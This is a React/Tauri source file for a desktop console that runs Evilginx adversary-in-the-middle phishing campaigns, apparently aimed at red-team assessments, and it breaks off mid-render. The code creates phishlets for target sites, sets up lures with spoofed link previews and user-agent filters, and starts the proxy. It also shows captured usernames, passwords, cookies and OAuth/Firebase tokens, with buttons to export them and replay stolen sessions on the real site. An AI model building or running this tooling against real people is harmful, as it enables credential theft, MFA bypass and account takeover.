import { Fragment, useCallback, useEffect, useMemo, useState } from "react";
import { invoke } from "@tauri-apps/api/core";
import {
  captureHasSessionTokens,
  cookieDomainCount,
  formatAccessTime,
  isEmptyCapture,
  sessionTimeline,
} from "./lib/captures";
import Hint from "./components/Hint";
import EmptyState from "./components/EmptyState";
import CommunityPhishlets from "./CommunityPhishlets";
import { IconTarget, IconInbox } from "./lib/icons";

const VIEWS = ["sites", "proxy", "community", "captures"];

function stackLabel(p) {
  const s = p?.stack_info;
  if (!s) return "—";
  return s.label || s.stack || "—";
}

const EMPTY_LURE_OPS = {
  redirectUrl: "",
  ogTitle: "",
  ogDesc: "",
  ogImage: "",
  ogUrl: "",
  uaFilter: "",
  redirector: "",
  path: "",
  extraPaths: [],
  paused: false,
  regeneratePath: false,
};

function lureOpsFromMeta(meta) {
  const o = meta?.lure_ops || meta?.lureOps || {};
  return {
    redirectUrl: o.redirectUrl || o.redirect_url || "",
    ogTitle: o.ogTitle || o.og_title || "",
    ogDesc: o.ogDesc || o.og_desc || "",
    ogImage: o.ogImage || o.og_image || "",
    ogUrl: o.ogUrl || o.og_url || "",
    uaFilter: o.uaFilter || o.ua_filter || "",
    redirector: o.redirector || "",
    path: o.path || "",
    extraPaths: o.extraPaths || o.extra_paths || [],
    paused: !!(o.paused),
    regeneratePath: false,
  };
}

function lureOpsFromLure(l) {
  if (!l) return { ...EMPTY_LURE_OPS };
  return {
    redirectUrl: l.redirectUrl || l.redirect_url || "",
    ogTitle: l.ogTitle || l.og_title || "",
    ogDesc: l.ogDesc || l.og_desc || "",
    ogImage: l.ogImage || l.og_image || "",
    ogUrl: l.ogUrl || l.og_url || "",
    uaFilter: l.uaFilter || l.ua_filter || "",
    redirector: l.redirector || "",
    path: l.path || "",
    extraPaths: [],
    paused: !!(l.paused),
    regeneratePath: false,
  };
}

function SuitabilityBanner({ stackInfo }) {
  if (!stackInfo?.suitability && !stackInfo?.suitability_notes?.length) return null;
  const level = stackInfo.suitability || "caution";
  const notes = stackInfo.suitabilityNotes || stackInfo.suitability_notes || [];
  return (
    <div className={`suitability suit-${level}`}>
      <strong>
        AiTM suitability:{" "}
        {level === "good" ? "good" : level === "poor" ? "poor — expect failure" : "caution"}
      </strong>
      <ul>
        {notes.map((n) => (
          <li key={n}>{n}</li>
        ))}
      </ul>
    </div>
  );
}

function CapturesPanel({
  busy,
  activeId,
  captures,
  isFirebase,
  firebaseKey,
  target,
  phishlet,
  refreshCaptures,
  run,
  append,
  setView,
  onOpenResults,
}) {
  const [linkedCampaigns, setLinkedCampaigns] = useState([]);
  const [sendMatches, setSendMatches] = useState([]);
  const [showEmpty, setShowEmpty] = useState(false);
  const [expanded, setExpanded] = useState(null);
  const [consoleHelp, setConsoleHelp] = useState(null);

  useEffect(() => {
    if (!activeId) return;
    refreshCaptures();
    const t = setInterval(() => {
      refreshCaptures();
    }, 2500);
    return () => clearInterval(t);
  }, [activeId, refreshCaptures]);

  useEffect(() => {
    if (!activeId) {
      setLinkedCampaigns([]);
      setSendMatches([]);
      return;
    }
    Promise.all([
      invoke("list_campaigns_for_profile", { profileId: activeId }),
      invoke("match_captures_to_sends", { profileId: activeId }),
    ])
      .then(([camps, matches]) => {
        setLinkedCampaigns(camps);
        setSendMatches(matches);
      })
      .catch(() => {
        setLinkedCampaigns([]);
        setSendMatches([]);
      });
  }, [activeId, captures]);

  const matchByEmail = useMemo(() => {
    const m = new Map();
    for (const s of sendMatches) {
      m.set((s.email || "").toLowerCase(), s);
    }
    return m;
  }, [sendMatches]);

  const emptyCount = useMemo(
    () => captures.filter(isEmptyCapture).length,
    [captures]
  );
  const visible = useMemo(
    () => (showEmpty ? captures : captures.filter((c) => !isEmptyCapture(c))),
    [captures, showEmpty]
  );

  const copyTokens = async (d) => {
    const custom = d.custom || {};
    const body = d.body_tokens || {};
    const payload = {
      id_token: custom.id_token || d.id_token || body.id_token || "",
      refresh_token: custom.refresh_token || d.refresh_token || body.refresh_token || "",
      access_token: body.access_token || "",
      cookies: d.tokens || {},
      username: d.username || "",
    };
    await navigator.clipboard?.writeText(
      payload.id_token ||
        payload.refresh_token ||
        payload.access_token ||
        JSON.stringify(payload, null, 2)
    );
    append("Token(s) copied to clipboard");
  };

  const copyRestore = async (d) => {
    const r = await run("restore", () =>
      invoke("build_restore_script", {
        capture: d,
        apiKey: firebaseKey,
        targetDomain: target || null,
        phishlet: phishlet || null,
      })
    );
    await navigator.clipboard?.writeText(r.script);
    setConsoleHelp({
      url: r.loginUrl || r.login_url || "",
      instructions: r.consoleInstructions || r.console_instructions || r.message,
    });
    append(r.message || "Restore script copied");
  };

  const launchSession = async (d) => {
    if (isFirebase && captureHasSessionTokens(d)) {
      if (!firebaseKey) {
        append("Set Firebase API key in Advanced before launching session");
        return;
      }
      const r = await run("launch", () =>
        invoke("launch_session_replay", {
          capture: d,
          apiKey: firebaseKey,
          targetDomain: target || "",
          phishlet: phishlet || "",
        })
      );
      setConsoleHelp({
        url: r.url || "",
        instructions: r.consoleInstructions || r.console_instructions || r.message,
      });
      append(r.message || "Session launch started");
      return;
    }
    const cookieJson = JSON.stringify(d.tokens || {}, null, 2);
    await navigator.clipboard?.writeText(cookieJson);
    const host = (target || "").replace(/^https?:\/\//, "").split("/")[0];
    const url = host ? `https://${host}/` : "";
    if (url) {
      try {
        const { openUrl } = await import("@tauri-apps/plugin-opener");
        await openUrl(url);
      } catch {
        window.open(url, "_blank");
      }
    }
    setConsoleHelp({
      url,
      instructions: `Cookie map copied.\n\n1. Open the real site${url ? ` (${url})` : ""} in a fresh/incognito window\n2. DevTools → Console\n3. Paste cookies carefully (or use Application → Cookies)\n4. Reload`,
    });
    append(url ? `Opened ${url}; cookies JSON copied` : "Cookies JSON copied");
  };

  return (
    <section className="card">
      <div className="section-head">
        <h2 className="section-head-title">
          Captures
          <Hint hint="Auto-syncs every few seconds. Empty sessions are hidden unless you show them." />
        </h2>
      </div>
      {linkedCampaigns.length > 0 && (
        <div className="linked-campaigns">
          <h3>Campaigns for this site</h3>
          <ul className="list compact">
            {linkedCampaigns.map((c) => (
              <li key={c.id}>
                <span>{c.name}</span>
                <span className="tag">{c.status}</span>
                <span className="small muted">
                  {c.sent} sent · {c.failed} failed · {c.pending} pending
                </span>
                {onOpenResults && (
                  <button
                    type="button"
                    className="ghost"
                    onClick={() => onOpenResults(c.id)}
                  >
                    Results →
                  </button>
                )}
              </li>
            ))}
          </ul>
        </div>
      )}
      {consoleHelp && (
        <div className="console-help">
          <strong>Console paste (if launch / link does not restore)</strong>
          <pre className="hint-panel">{consoleHelp.instructions}</pre>
          {consoleHelp.url && (
            <p className="mono small">Target: {consoleHelp.url}</p>
          )}
          <button type="button" className="ghost" onClick={() => setConsoleHelp(null)}>
            Dismiss
          </button>
        </div>
      )}
      <div className="row">
        <button
          data-testid="captures-sync"
          disabled={!!busy || !activeId}
          onClick={refreshCaptures}
        >
          Sync now
        </button>
        <label className="check">
          <input
            type="checkbox"
            checked={showEmpty}
            onChange={(e) => setShowEmpty(e.target.checked)}
          />
          Show empty{emptyCount ? ` (${emptyCount})` : ""}
        </label>
        {showEmpty && emptyCount > 0 && (
          <button
            disabled={!!busy || !activeId}
            className="ghost"
            onClick={() =>
              run("prune", () => invoke("prune_captures", { profileId: activeId })).then(
                refreshCaptures
              )
            }
          >
            Prune empty
          </button>
        )}
      </div>
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Accessed</th>
            <th>User</th>
            <th>Pass</th>
            <th>Details</th>
            <th>Mail</th>
            <th />
          </tr>
        </thead>
        <tbody>
          {visible.map((c) => {
            const d = c.data || {};
            const custom = d.custom || {};
            const hasTok = captureHasSessionTokens(d);
            const cookieN = cookieDomainCount(d);
            const user = (d.username || "").toLowerCase();
            const hit = user ? matchByEmail.get(user) : null;
            const empty = isEmptyCapture(c);
            const sid = c.evilginx_session_id;
            const open = expanded === sid;
            const updated =
              c.evilginx_update_time ?? c.evilginxUpdateTime ?? d.update_time;
            const created =
              c.evilginx_create_time ?? c.evilginxCreateTime ?? d.create_time;
            return (
              <Fragment key={sid}>
                <tr className={empty ? "capture-empty" : ""}>
                  <td>{sid}</td>
                  <td
                    className="small"
                    title={
                      updated && updated !== created
                        ? `Updated: ${formatAccessTime({ data: { create_time: updated } })}`
                        : undefined
                    }
                  >
                    {formatAccessTime(c)}
                  </td>
                  <td className="mono">{d.username || "—"}</td>
                  <td className="mono">{d.password ? "••••" : "—"}</td>
                  <td className="small">
                    <button
                      type="button"
                      className="linkish"
                      onClick={() => setExpanded(open ? null : sid)}
                    >
                      {open ? "▾ hide" : "▸ show"}
                      {hasTok ? " · tokens" : ""}
                      {cookieN ? ` · ${cookieN} cookie domains` : ""}
                      {d.remote_addr ? " · IP" : ""}
                    </button>
                  </td>
                  <td className="small">
                    {hit ? (
                      <span className="tag" title={hit.sentAt || hit.sent_at || ""}>
                        {hit.campaignName || hit.campaign_name}
                      </span>
                    ) : (
                      "—"
                    )}
                  </td>
                  <td className="row capture-actions">
                    {(hasTok || cookieN > 0) && (
                      <button
                        className="ghost"
                        disabled={!!busy}
                        onClick={() => launchSession(d)}
                      >
                        Launch session
                      </button>
                    )}
                    {(hasTok || cookieN > 0) && (
                      <button
                        className="ghost"
                        disabled={!!busy}
                        onClick={() => copyTokens(d)}
                      >
                        Copy token
                      </button>
                    )}
                    {cookieN > 0 && (
                      <button
                        className="ghost"
                        disabled={!!busy}
                        onClick={() =>
                          run("cookies", () =>
                            invoke("export_capture_cookies", {
                              profileId: activeId,
                              evilginxSessionId: sid,
                              format: "netscape",
                            })
                          ).then((txt) => {
                            navigator.clipboard?.writeText(txt);
                            append("Netscape cookies copied");
                          })
                        }
                      >
                        Cookies.txt
                      </button>
                    )}
                    {cookieN > 0 && (
                      <button
                        className="ghost"
                        disabled={!!busy}
                        onClick={() =>
                          run("cookies", () =>
                            invoke("export_capture_cookies", {
                              profileId: activeId,
                              evilginxSessionId: sid,
                              format: "json",
                            })
                          ).then((txt) => {
                            navigator.clipboard?.writeText(txt);
                            append("Cookie JSON copied");
                          })
                        }
                      >
                        Cookies JSON
                      </button>
                    )}
                    {isFirebase && hasTok && (
                      <button
                        className="ghost"
                        disabled={!!busy}
                        onClick={() => copyRestore(d)}
                      >
                        Copy console script
                      </button>
                    )}
                    <button
                      className="ghost"
                      onClick={() => {
                        navigator.clipboard?.writeText(JSON.stringify(d, null, 2));
                        append("Capture JSON copied");
                      }}
                    >
                      JSON
                    </button>
                    <button
                      className="ghost"
                      onClick={() =>
                        run("del", () =>
                          invoke("delete_capture", {
                            profileId: activeId,
                            evilginxSessionId: sid,
                          })
                        ).then(refreshCaptures)
                      }
                    >
                      Delete
                    </button>
                  </td>
                </tr>
                {open && (
                  <tr className="capture-details-row">
                    <td colSpan={7}>
                      <div className="timeline">
                        <strong>Session timeline</strong>
                        <ol>
                          {sessionTimeline(c, hit).map((ev, i) => (
                            <li key={`${ev.label}-${i}`}>
                              <span className="tl-label">{ev.label}</span>
                              <span className="tl-detail mono small">{ev.detail}</span>
                            </li>
                          ))}
                        </ol>
                      </div>
                      <dl className="capture-details">
                        <div>
                          <dt>Accessed</dt>
                          <dd>{formatAccessTime(c)}</dd>
                        </div>
                        <div>
                          <dt>IP</dt>
                          <dd className="mono">{d.remote_addr || "—"}</dd>
                        </div>
                        <div>
                          <dt>User-Agent</dt>
                          <dd className="small">
                            {(d.useragent || d.user_agent || "—").slice(0, 220)}
                          </dd>
                        </div>
                        <div>
                          <dt>Landing</dt>
                          <dd className="mono small">{d.landing_url || "—"}</dd>
                        </div>
                        <div>
                          <dt>Phishlet</dt>
                          <dd className="mono">{d.phishlet || phishlet || "—"}</dd>
                        </div>
                        <div>
                          <dt>Tokens</dt>
                          <dd>
                            {hasTok
                              ? [
                                  custom.id_token || d.id_token ? "id_token" : null,
                                  custom.refresh_token || d.refresh_token
                                    ? "refresh_token"
                                    : null,
                                  d.body_tokens?.access_token ? "access_token" : null,
                                ]
                                  .filter(Boolean)
                                  .join(", ") || "yes"
                              : "none"}
                            {cookieN ? ` · cookies on ${cookieN} domain(s)` : ""}
                          </dd>
                        </div>
                        {custom && Object.keys(custom).length > 0 && (
                          <div className="full">
                            <dt>Custom fields</dt>
                            <dd>
                              <pre className="code tiny">
                                {JSON.stringify(custom, null, 2).slice(0, 1200)}
                              </pre>
                            </dd>
                          </div>
                        )}
                        {d.body_tokens && Object.keys(d.body_tokens).length > 0 && (
                          <div className="full">
                            <dt>Body tokens</dt>
                            <dd>
                              <pre className="code tiny">
                                {JSON.stringify(d.body_tokens, null, 2).slice(0, 1200)}
                              </pre>
                            </dd>
                          </div>
                        )}
                      </dl>
                    </td>
                  </tr>
                )}
              </Fragment>
            );
          })}
        </tbody>
      </table>
      {!visible.length &&
        (captures.length && !showEmpty ? (
          <p className="muted">
            {`${captures.length} empty session${
              captures.length === 1 ? "" : "s"
            } hidden.`}
          </p>
        ) : (
          <EmptyState compact icon={<IconInbox size={20} />} title="No captures yet">
            New sessions appear automatically after a lure hit.
          </EmptyState>
        ))}
      <div className="row end">
        <button className="ghost" onClick={() => setView("proxy")}>
          ← Proxy
        </button>
      </div>
    </section>
  );
}

export default function Destinations({
  busy,
  setBusy,
  append,
  kit,
  status,
  refreshChrome,
  onUseInCampaign,
  onOpenResults,
  initialProfileId = "",
  hideSitesList = false,
  assessmentId = null,
  initialView = "",
  /** When set by parent (e.g. demo tour), force the recon sub-step. */
  forcedView = "",
  onViewChange,
}) {
  const [view, setView] = useState(() => {
    if (initialView && initialView !== "sites") return initialView;
    if (hideSitesList && initialProfileId) return initialView || "proxy";
    return "sites";
  });

  const changeView = useCallback(
    (id) => {
      setView(id);
      onViewChange?.(id);
    },
    [onViewChange]
  );

  useEffect(() => {
    if (forcedView && forcedView !== view) {
      setView(forcedView);
    }
  }, [forcedView]); // eslint-disable-line react-hooks/exhaustive-deps -- sync from tour only
  const [creating, setCreating] = useState(false);
  const [advancedOpen, setAdvancedOpen] = useState(false);

  const [profiles, setProfiles] = useState([]);
  const [activeId, setActiveId] = useState("");
  const [profileName, setProfileName] = useState("");
  const [target, setTarget] = useState("");
  const [newUrl, setNewUrl] = useState("");
  const [newName, setNewName] = useState("");
  const [dryrun, setDryrun] = useState("");
  const [phishlet, setPhishlet] = useState("");
  const [lure, setLure] = useState("");
  const [stackInfo, setStackInfo] = useState(null);
  const [firebaseHooks, setFirebaseHooks] = useState(false);

  const [templates, setTemplates] = useState([]);
  const [hosts, setHosts] = useState(null);
  const [captures, setCaptures] = useState([]);
  const [firebaseKey, setFirebaseKey] = useState("");
  const [evilLog, setEvilLog] = useState("");
  const [lureOps, setLureOps] = useState(EMPTY_LURE_OPS);
  const [redirectors, setRedirectors] = useState([]);
  const [caInfo, setCaInfo] = useState(null);
  const [readiness, setReadiness] = useState(null);
  const [namedLures, setNamedLures] = useState([]);
  const [selectedLureId, setSelectedLureId] = useState("");
  const [newLureName, setNewLureName] = useState("");
  const [phishletYaml, setPhishletYaml] = useState("");
  const [editorOpen, setEditorOpen] = useState(false);
  const [authMetaBase, setAuthMetaBase] = useState({});

  const run = async (label, fn) => {
    setBusy(label);
    try {
      const r = await fn();
      if (typeof r === "string" && r.trim()) append(r.trim().slice(0, 2000));
      return r;
    } catch (e) {
      append(`${label}: ${e}`);
      throw e;
    } finally {
      setBusy("");
    }
  };

  const loadProfiles = useCallback(async () => {
    try {
      const plistPromise = assessmentId
        ? invoke("cmd_list_targets", { assessmentId })
        : invoke("list_profiles");
      const [plist, aid] = await Promise.all([
        plistPromise,
        invoke("get_active_profile"),
      ]);
      setProfiles(plist);
      const pick = initialProfileId || aid;
      if (pick && !activeId) setActiveId(pick);
    } catch (e) {
      append(String(e));
    }
  }, [activeId, append, assessmentId, initialProfileId]);

  useEffect(() => {
    loadProfiles();
    invoke("list_templates").then(setTemplates).catch(() => {});
    invoke("list_redirectors").then(setRedirectors).catch(() => setRedirectors([]));
    invoke("ca_trust_info").then(setCaInfo).catch(() => {});
  }, [loadProfiles]);

  const refreshReadiness = useCallback(async () => {
    if (!activeId) {
      setReadiness(null);
      return;
    }
    try {
      setReadiness(await invoke("cmd_target_readiness", { profileId: activeId }));
    } catch {
      setReadiness(null);
    }
  }, [activeId]);

  useEffect(() => {
    refreshReadiness();
    if (!activeId) return undefined;
    const t = setInterval(refreshReadiness, 8000);
    return () => clearInterval(t);
  }, [activeId, refreshReadiness]);

  const selectNamedLure = useCallback((row) => {
    if (!row) return;
    setSelectedLureId(row.id);
    setLureOps(lureOpsFromLure(row));
  }, []);

  const loadNamedLures = useCallback(async () => {
    if (!activeId) {
      setNamedLures([]);
      setSelectedLureId("");
      return;
    }
    try {
      const rows = await invoke("cmd_list_lures", { profileId: activeId });
      setNamedLures(rows);
      if (!rows.length) {
        setSelectedLureId("");
        return;
      }
      setSelectedLureId((prev) => {
        const keep = prev && rows.some((r) => r.id === prev);
        const next = keep
          ? prev
          : (rows.find((r) => r.isDefault || r.is_default) || rows[0]).id;
        if (!keep) {
          const row = rows.find((r) => r.id === next);
          if (row) setLureOps(lureOpsFromLure(row));
        }
        return next;
      });
    } catch (e) {
      append(String(e));
    }
  }, [activeId, append]);

  useEffect(() => {
    loadNamedLures();
  }, [loadNamedLures]);

  useEffect(() => {
    if (!initialProfileId) return;
    setActiveId(initialProfileId);
    invoke("activate_profile", { id: initialProfileId }).catch(() => {});
    if (hideSitesList) setView(initialView || "proxy");
  }, [initialProfileId, hideSitesList, initialView]);

  useEffect(() => {
    if (initialView) setView(initialView);
  }, [initialView]);

  const applyProfile = useCallback((p) => {
    if (!p) return;
    setProfileName(p.name || p.id);
    setTarget(p.target_domain || "");
    setDryrun(p.dryrun_domain || "");
    setPhishlet(p.phishlet || "");
    setLure(p.lure_url || "");
    setStackInfo(p.stack_info || null);
    const meta = p.auth_meta || {};
    setAuthMetaBase(meta);
    setFirebaseKey(meta.firebase_api_key || meta.firebaseApiKey || "");
    setLureOps(lureOpsFromMeta(meta));
  }, []);

  useEffect(() => {
    if (!activeId) return;
    invoke("get_profile", { id: activeId })
      .then(applyProfile)
      .catch(() => {});
  }, [activeId, applyProfile]);

  const isFirebase = stackInfo?.stack === "firebase";

  const selectSite = async (id) => {
    setActiveId(id);
    if (id) await invoke("activate_profile", { id });
    setCreating(false);
    setView("proxy");
  };

  const onCreateSite = async () => {
    const url = newUrl.trim();
    if (!url) {
      append("Enter a website URL or domain");
      return;
    }
    const r = await run("create", () =>
      invoke("ensure_destination", {
        target: url,
        name: newName.trim() || null,
        overwrite: false,
        assessmentId: assessmentId || null,
      })
    );
    append(r.message || "Site ready");
    if (r.firebase_hooks) append("Firebase credential hooks present");
    setFirebaseHooks(!!r.firebase_hooks);
    setActiveId(r.profile.id);
    applyProfile(r.profile);
    const si = r.detect?.stack_info || r.phishlet?.stack_info;
    if (si) {
      setStackInfo(si);
      const level = si.suitability || "caution";
      if (level === "poor") {
        append(`Suitability: poor — ${((si.suitability_notes || si.suitabilityNotes) || [])[0] || "expect AiTM failure"}`);
      } else if (level === "caution") {
        append(`Suitability: caution — review Cloudflare / OAuth notes`);
      } else {
        append("Suitability: good for AiTM dry-run");
      }
    }
    setProfiles(await invoke("list_profiles"));
    setNewUrl("");
    setNewName("");
    setCreating(false);
    setView("proxy");
  };

  const onRefreshSite = async (overwrite = false) => {
    if (!target) return;
    const r = await run("refresh", () =>
      invoke("ensure_destination", {
        target,
        name: profileName || null,
        overwrite,
      })
    );
    append(r.message || "Updated");
    setFirebaseHooks(!!r.firebase_hooks);
    applyProfile(r.profile);
    if (r.phishlet?.stack_info) setStackInfo(r.phishlet.stack_info);
    setProfiles(await invoke("list_profiles"));
  };

  const saveProfile = async (extra = {}) => {
    const ops = extra.lureOps ?? lureOps;
    const authMeta = {
      ...authMetaBase,
      firebase_api_key: firebaseKey || authMetaBase.firebase_api_key || "",
      lure_ops: {
        redirectUrl: ops.redirectUrl || "",
        ogTitle: ops.ogTitle || "",
        ogDesc: ops.ogDesc || "",
        ogImage: ops.ogImage || "",
        ogUrl: ops.ogUrl || "",
        uaFilter: ops.uaFilter || "",
        redirector: ops.redirector || "",
        path: ops.path || "",
        extraPaths: ops.extraPaths || [],
        paused: !!ops.paused,
        regeneratePath: !!ops.regeneratePath,
      },
    };
    const p = await run("save", () =>
      invoke("upsert_profile", {
        req: {
          id: activeId || undefined,
          name: profileName || target || "site",
          phishlet: extra.phishlet ?? phishlet,
          dryrunDomain: extra.dryrun ?? dryrun,
          targetDomain: extra.target ?? target,
          lureUrl: extra.lure ?? lure,
          stackInfo: extra.stackInfo ?? stackInfo,
          authMeta,
        },
      })
    );
    setActiveId(p.id);
    setAuthMetaBase(p.auth_meta || authMeta);
    setProfiles(await invoke("list_profiles"));
    if (selectedLureId) {
      try {
        const sel = namedLures.find((r) => r.id === selectedLureId);
        await invoke("cmd_upsert_lure", {
          req: {
            id: selectedLureId,
            profileId: p.id,
            name: sel?.name || "Default",
            path: ops.path || null,
            lureUrl: (extra.lure ?? lure) || null,
            redirectUrl: ops.redirectUrl || null,
            redirector: ops.redirector || null,
            uaFilter: ops.uaFilter || null,
            ogTitle: ops.ogTitle || null,
            ogDesc: ops.ogDesc || null,
            ogImage: ops.ogImage || null,
            ogUrl: ops.ogUrl || null,
            paused: !!ops.paused,
          },
        });
        await loadNamedLures();
      } catch (e) {
        append(`lure sync: ${e}`);
      }
    }
    return p;
  };

  const createNamedLure = async () => {
    const name = newLureName.trim() || `Lure ${namedLures.length + 1}`;
    if (!activeId) return;
    await run("create-lure", () =>
      invoke("cmd_upsert_lure", {
        req: {
          profileId: activeId,
          name,
          redirectUrl: lureOps.redirectUrl || null,
          redirector: lureOps.redirector || null,
          uaFilter: lureOps.uaFilter || null,
          ogTitle: lureOps.ogTitle || null,
          ogDesc: lureOps.ogDesc || null,
          ogImage: lureOps.ogImage || null,
          ogUrl: lureOps.ogUrl || null,
          paused: false,
          isDefault: namedLures.length === 0,
        },
      })
    );
    setNewLureName("");
    await loadNamedLures();
  };

  const setDefaultNamedLure = async (lureId) => {
    if (!activeId || !lureId) return;
    await run("default-lure", () =>
      invoke("cmd_set_default_lure", { profileId: activeId, lureId })
    );
    await loadNamedLures();
  };

  const deleteNamedLure = async (lureId) => {
    if (!lureId) return;
    await run("delete-lure", () => invoke("cmd_delete_lure", { id: lureId }));
    await loadNamedLures();
  };

  const onCommunityImported = async (r) => {
    const stem = String(r?.name || "").replace(/\.ya?ml$/i, "");
    if (!stem) return;
    setPhishlet(stem);
    if (target) {
      const res = await invoke("resolve_engagement", {
        targetDomain: target,
        dryrunDomain: dryrun || null,
        phishlet: stem,
      });
      if (res.dryrun_domain) setDryrun(res.dryrun_domain);
      await saveProfile({
        phishlet: stem,
        dryrun: res.dryrun_domain || dryrun,
        target,
      });
    } else {
      await saveProfile({ phishlet: stem });
    }
  };

  const onPattern = async (templateId) => {
    if (!target) {
      append("Select or create a site first");
      return;
    }
    const r = await run("pattern", () =>
      invoke("scaffold_pattern", { target, templateId })
    );
    setPhishlet(r.phishlet);
    setDryrun(r.dryrun_domain);
    setStackInfo(r.stack_info);
    await saveProfile({
      target: r.target_domain,
      phishlet: r.phishlet,
      dryrun: r.dryrun_domain,
      stackInfo: r.stack_info,
    });
  };

  const refreshHosts = async () => {
    if (!dryrun) return;
    try {
      setHosts(
        await invoke("hosts_status", {
          dryrunDomain: dryrun,
          phishlet: phishlet || null,
        })
      );
    } catch (e) {
      append(String(e));
    }
  };

  useEffect(() => {
    if (view === "proxy" && dryrun) refreshHosts();
  }, [view, dryrun, phishlet]);

  const onFixHosts = async () => {
    const r = await run("hosts", () =>
      invoke("hosts_fix", { dryrunDomain: dryrun, phishlet: phishlet || null })
    );
    append(JSON.stringify(r));
    await refreshHosts();
  };

  const onStart = async () => {
    if (!phishlet || !dryrun) {
      append("Site needs a phishlet and dry-run domain — recreate the site");
      return;
    }
    const p = await saveProfile({ target, phishlet, dryrun });
    const r = await run("lure", () =>
      invoke("evilginx_start_lure", {
        profileId: p.id,
        dryrunDomain: dryrun,
        phishletName: phishlet,
        lureOps: {
          redirectUrl: lureOps.redirectUrl || "",
          ogTitle: lureOps.ogTitle || "",
          ogDesc: lureOps.ogDesc || "",
          ogImage: lureOps.ogImage || "",
          ogUrl: lureOps.ogUrl || "",
          uaFilter: lureOps.uaFilter || "",
          redirector: lureOps.redirector || "",
          path: lureOps.path || "",
          extraPaths: lureOps.extraPaths || [],
          paused: !!lureOps.paused,
          regeneratePath: !!lureOps.regeneratePath,
        },
      })
    );
    if (r.lure_url) {
      setLure(r.lure_url);
      try {
        const path = new URL(r.lure_url).pathname;
        if (path && path !== "/") {
          setLureOps((prev) => ({ ...prev, path, regeneratePath: false }));
        }
      } catch {
        /* ignore */
      }
    }
    append(r.message);
    if (r.evilginx_running) {
      append("Status: AiTM proxy up");
      append(
        "After restart: clear dry-run domain cookies in the test browser if logins look stuck."
      );
    }
    invoke("ca_trust_info").then(setCaInfo).catch(() => {});
    for (let i = 0; i < 6; i++) {
      await refreshChrome();
      const s = await invoke("get_service_status");
      if (s.evilginx_running) break;
      await new Promise((res) => setTimeout(res, 500));
    }
    await refreshHosts();
  };

  const loadPhishletEditor = async () => {
    if (!phishlet) return;
    const r = await run("phishlet", () =>
      invoke("get_phishlet_yaml", { name: phishlet })
    );
    setPhishletYaml(r.yaml || "");
    setEditorOpen(true);
  };

  const savePhishletEditor = async () => {
    if (!phishlet) return;
    await run("phishlet-save", () =>
      invoke("save_phishlet_yaml", { name: phishlet, yaml: phishletYaml })
    );
    append("Phishlet saved — restart proxy to reload");
  };

  const addExtraLurePath = () => {
    const token = Math.random().toString(36).slice(2, 10);
    setLureOps((prev) => ({
      ...prev,
      extraPaths: [...(prev.extraPaths || []), `/${token}`],
    }));
  };

  const onStop = async () => {
    await run("stop", () => invoke("evilginx_stop"));
    await refreshChrome();
  };

  const refreshCaptures = useCallback(async () => {
    if (!activeId) return;
    try {
      setCaptures(await invoke("sync_captures", { profileId: activeId }));
    } catch (e) {
      try {
        setCaptures(await invoke("list_captures", { profileId: activeId }));
      } catch (_) {
        append(String(e));
      }
    }
  }, [activeId, append]);

  const activeProfile = profiles.find((p) => p.id === activeId);

  const visibleViews = hideSitesList
    ? VIEWS.filter((id) => id !== "sites")
    : VIEWS;

  const stepLabel = (id) =>
    id === "sites"
      ? "Sites"
      : id === "proxy"
        ? "Proxy"
        : id === "community"
          ? "Community"
          : "Captures";

  return (
    <>
      {visibleViews.length > 1 && (
        <nav className="steps">
          {visibleViews.map((id) => {
            // Community catalog does not require an active profile.
            const disabled = id !== "sites" && id !== "community" && !activeId;
            return (
              <button
                key={id}
                data-testid={`dest-step-${id}`}
                className={view === id ? "active" : ""}
                onClick={() => !disabled && changeView(id)}
                type="button"
                disabled={disabled}
              >
                {stepLabel(id)}
              </button>
            );
          })}
        </nav>
      )}

      {view === "sites" && !hideSitesList && (
        <section className="card">
          <div className="sites-header">
            <h2 className="section-head-title">
              Sites
              <Hint hint="A profile is one website. We detect the stack and generate a phishlet for it." />
            </h2>
            <button
              type="button"
              disabled={!!busy}
              onClick={() => setCreating((v) => !v)}
            >
              {creating ? "Cancel" : "New site"}
            </button>
          </div>

          {creating && (
            <div className="site-create">
              <label className="block">
                <span className="label-with-hint">
                  Website URL
                  <Hint hint="Detects Firebase, OAuth, JWT, cookies, etc. Reuses an existing Firebase phishlet with credential hooks instead of overwriting it." />
                </span>
                <input
                  value={newUrl}
                  onChange={(e) => setNewUrl(e.target.value)}
                  placeholder="https://app.client.com or app.client.com"
                  autoFocus
                  onKeyDown={(e) => {
                    if (e.key === "Enter") onCreateSite();
                  }}
                />
              </label>
              <label className="block">
                Name <span className="muted small">(optional)</span>
                <input
                  value={newName}
                  onChange={(e) => setNewName(e.target.value)}
                  placeholder="defaults to hostname"
                />
              </label>
              <div className="row">
                <button disabled={!!busy || !newUrl.trim()} onClick={onCreateSite}>
                  {busy === "create" ? "Detecting…" : "Detect stack & create phishlet"}
                </button>
              </div>
            </div>
          )}

          <ul className="site-list">
            {profiles.map((p) => {
              const selected = p.id === activeId;
              return (
                <li key={p.id} className={selected ? "selected" : ""}>
                  <button
                    type="button"
                    className="site-row"
                    onClick={() => selectSite(p.id)}
                  >
                    <span className="site-name">{p.name}</span>
                    <span className="mono small">{p.target_domain || "—"}</span>
                    <span className="tag">{stackLabel(p)}</span>
                    <span className="mono small muted">{p.phishlet || "no phishlet"}</span>
                  </button>
                  <button
                    type="button"
                    className="ghost"
                    disabled={!!busy}
                    title="Delete profile"
                    onClick={async (e) => {
                      e.stopPropagation();
                      await run("delete", () => invoke("delete_profile", { id: p.id }));
                      if (activeId === p.id) {
                        setActiveId("");
                        setView("sites");
                      }
                      loadProfiles();
                    }}
                  >
                    Delete
                  </button>
                </li>
              );
            })}
          </ul>
          {!profiles.length && !creating && (
            <EmptyState
              icon={<IconTarget size={22} />}
              title="No sites yet"
              action={
                <button type="button" disabled={!!busy} onClick={() => setCreating(true)}>
                  Add your first site
                </button>
              }
            >
              Add a target URL — we detect the stack and generate a phishlet.
            </EmptyState>
          )}
        </section>
      )}

      {view === "proxy" && activeId && (
        <section className="card">
          <h2>{profileName || activeProfile?.name || "Site"}</h2>
          {readiness?.checks?.length > 0 && (
            <div className="preflight">
              <div className="row" style={{ justifyContent: "space-between" }}>
                <h3 style={{ margin: 0 }}>Preflight</h3>
                <button
                  type="button"
                  className="ghost"
                  disabled={!!busy}
                  onClick={() => refreshReadiness()}
                >
                  Refresh checks
                </button>
              </div>
              <ul className="list compact">
                {readiness.checks.map((c) => (
                  <li key={c.id}>
                    <span className={`pill-status ${c.ok ? "running" : "draft"}`}>
